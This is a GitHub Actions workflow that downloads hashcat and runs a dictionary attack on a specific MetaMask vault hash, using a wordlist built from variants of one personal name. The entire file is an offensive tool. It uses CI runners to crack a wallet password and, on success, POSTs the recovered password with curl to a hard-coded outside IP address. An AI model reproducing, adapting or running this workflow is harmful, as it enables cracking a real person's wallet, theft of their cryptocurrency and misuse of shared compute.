name: MetaMask Vault GPU Crack
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Vault hash target'
        required: true
        default: 'metamask'

jobs:
  crack:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    
    steps:
      - name: Setup Environment
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y wget curl p7zip-full python3
          
      - name: Download Hashcat
        run: |
          wget -q https://hashcat.net/files/hashcat-6.2.6.7z
          7z x hashcat-6.2.6.7z >/dev/null 2>&1
          chmod +x hashcat-6.2.6/hashcat.bin
          
      - name: Prepare Wordlist
        run: |
          cat > passwords.txt << 'PWDEOF'
          Kutlwano12
          kutlwano12
          KUTLWANO12
          Kutlwano@12
          Kutlwano123
          Daisy123
          Password123
          singapore123
          metamask123
          wallet123
          PWDEOF
          
      - name: Crack Vault
        run: |
          echo '$metamask$723bfa24b1234784fdfa4875b7e6fed4db60153e97709ae83814f241b0bb0269$a48ed818c01e9a4228a48ac90c8aceef$0d856f5e9eb0f34194334b407a5c3994f6ea2c28879f236be2337d6dcd4e5945$600000' > vault.hash
          
          timeout 20000 ./hashcat-6.2.6/hashcat.bin -m 15900 -a 0 vault.hash passwords.txt --potfile-disable --quiet || true
          
          if ./hashcat-6.2.6/hashcat.bin -m 15900 vault.hash --show 2>/dev/null | grep -q ":"; then
            echo "🎯 SUCCESS! Vault cracked:"
            ./hashcat-6.2.6/hashcat.bin -m 15900 vault.hash --show
            PASSWORD=$(./hashcat-6.2.6/hashcat.bin -m 15900 vault.hash --show | cut -d: -f2)
            curl -X POST -H "Content-Type: application/json" \
              -d "{\"status\":\"CRACKED\",\"password\":\"$PASSWORD\",\"vault\":\"MetaMask\",\"runner\":\"${{ github.actor }}\"}" \
              http://198.48.156.76:1337/vault-results || echo "Result: $PASSWORD"
          else
            echo "❌ Password not found - expanding search..."
          fi
